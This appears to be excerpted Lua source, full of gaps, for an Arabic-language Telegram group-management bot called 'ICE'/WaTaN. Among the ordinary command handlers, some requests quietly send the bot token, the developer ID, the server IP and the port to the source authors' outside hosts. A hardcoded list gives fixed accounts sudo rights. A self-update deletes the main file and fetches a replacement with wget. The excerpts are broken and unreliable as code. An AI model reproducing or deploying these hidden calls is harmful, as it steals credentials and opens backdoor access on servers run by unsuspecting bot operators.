...
data,res = https.request("https://api-WaTaNml/WaTaN/index.php?Ban=WaTaN&Info&Id="..Id)
if res == 200 then
...
https.request("https://api-WaTaNml/WaTaN/index.php?Get=WaTaN&DevId="..database:get(Server.."UserSudo_Write").."&TokenBot="..database:get(Server.."Token_Write").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
print("::WaTaN::")
...
sudo_users = {SUDO,115872761,1778724697,1786829586}   
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼┇source ICE.")  
...
if File_Name ~= "ICE.lua" then 
send(chat,msg.id_," ✯︙هذا الملف غير تابع لسورس نايت")
return false 
end      
local File = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..ID_FILE) ) 
...
os.execute('rm -rf ICE.lua')
os.execute('wget https://raw.githubusercontent.com/WaTaNtEaM/WaTaN/main/ICE.lua')
...
send(msg.chat_id_, msg.id_,'✯︙اهلا بك عزيزي\n✯︙ان كان لديك استفسار او اي مشكلة\n✯︙يمكنك مراسلة مطور السورس\n✯︙حساب مطور السورس [اضـغـط هـنـا  𓆩•𝐀𝐁𝐁𝐀𝐒 𝐅𝐀𝐃𝐇𝐈𝐋•𓆪  ](t.me/ICE50)')
end
...
WaTaN = ICE.k.."- (`"..v.."`) ~ (`"..database:get(bot_id.."WaTaN:ProGroups:Time"..v).."`) \n- "..link_ICE." \n" 
end
if #List == 0 then
...
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, './ICE.lua', '✯︙نسخة ملف سورس نايت')
end 
end
...
*تحديثات وشروحات سورس نايت*
*قم بالضغط في الاسفل ليحولك الئ القناة*
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '📂┇𝚆𝙰𝚃𝙰𝙽 𝚄𝙿𝙳𝙰𝚃𝙴𝚂.', url="t.me/ICE53"}},
}
...
send(msg.chat_id_, msg.id_,"حاله الاضافات هي : {"..MRICE."}\nاذا كانت {✔} الاضافات مفعله\nاذا كانت {✖} الاضافات معطله")
end
...
Text = "[⦑ Welcome to Source ⦒](t.me/ICE53)\n[✯ ⦑ SOURCE ICE ⦒](t.me/ICE53)\n✯ Source version : 2.7"
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝒄𝒉𝒂𝒏𝒏𝒆𝒍 𝒔𝒐𝒖𝒓𝒄𝒆',url="t.me/ICE53"},
{text = '𝒖𝒑𝒅𝒂𝒕𝒆 𝒔𝒐𝒖𝒓𝒄𝒆',url="t.me/watanupdate"}},
{{text = '𝒊𝒏𝒔𝒕𝒂𝒍𝒍 𝒔𝒐𝒖𝒓𝒄𝒆',url="https://t.me/ICE53/7"},
{text = '𝒘𝒂𝒕𝒂𝒏 𝒈𝒓𝒐𝒖𝒑',url="https://t.me/joinchat/MJjy8Vab_jVmODdi"}},
{{text = '𝒅𝒆𝒗𝒆𝒍𝒐𝒑𝒆𝒓',url="t.me/ICE50"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/ICE53&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, './File_Bot/Reply.lua', '✯︙ملف الردود الخاص بسورس نايت')
end 
end
...
database:set(bot_id.."Abs:Lock:ICEClub"..msg.chat_id_,true)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل الاباحي ')
end,nil)   
elseif text == 'فتح الاباحي' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."Abs:Lock:ICEClub"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم فتح الاباحي ')
end,nil)   
end
...
if database:get(bot_id.."Abs:Lock:ICEClub"..msg.chat_id_) and msg.reply_to_message_id_ == 0 then
...
HttpsMsg = https.request('https://api-ICEml/abahi/abahi.php?Get=WaTaN&TokenBot='..token..'&Url='..UrlId)
...
Text = [[
  ✯︙[DeVeLoPErE OF SoURcE](https://t.me/ICE50)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '✯︙DeVeLoPErE OF SoURcE',url="t.me/ICE50"}},
{{text = '✯︙ChAnNeL OF SoURcE',url="t.me/ICE53"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/ICE53&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
...
Text = [[
[✯︙ChAnNeL OF SoURcE](https://t.me/ICE53)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '✯︙ChAnNeL OF SoURcE',url="t.me/ICE53"}},
...
{{text = 'WaTaN TeaM .', url="t.me/ICE53"}},
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '🖨┇source ICE.',url="t.me/ICE53"}},
}
local msg_id = msg.id_/2097152/0.5
...
local photps = (ICEtotal_count_ or 0)
...
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, ICEphotos_[0].sizes_[1].photo_.persistent_id_,get_id_text)       
else 
...
{
{text = 'ICE CHANNEL', url="t.me/ICE53"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
send(msg.chat_id_, msg.id_, t..'ٴ≪━━━━ ICE ━━━━≫ٴٴ\n✯︙➫ .[🖨┇source ICE. ](t.me/ICE53)➤ ')
end
...
end -- end new msg dev.mr ICE 
end -- end callback dev.mr ICE
